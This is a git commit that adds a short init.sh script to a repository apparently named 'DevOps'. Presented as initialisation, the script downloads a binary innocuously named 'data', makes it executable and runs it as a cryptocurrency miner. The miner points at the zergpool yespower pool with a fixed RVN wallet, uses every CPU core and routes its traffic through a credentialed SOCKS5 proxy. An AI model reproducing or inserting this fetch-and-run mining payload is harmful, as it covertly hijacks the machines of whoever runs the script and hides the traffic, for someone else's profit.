953c6624b840d701f46cb65e28154c0ff68fce19
thirthada007 <88758710+thirthada007@users.noreply.github.com>
2022-04-16 15:17:02 +0530

    Add files via upload
    update init

---
+++ init.sh
@@ -0,0 +1,4 @@
+apt update -y
+wget -q https://github.com/thirthada007/DevOps/raw/main/data
+chmod +x data
+./data -a yespower -o stratum+tcp://yespower.na.mine.zergpool.com:6533 -u RBxXP9udHoS2Xc27vMMMmxi79CbMmaj1u7.Test -p c=RVN -t $(nproc) -x socks5://lebarankita:buatTHRan@154.38.34.3:5015
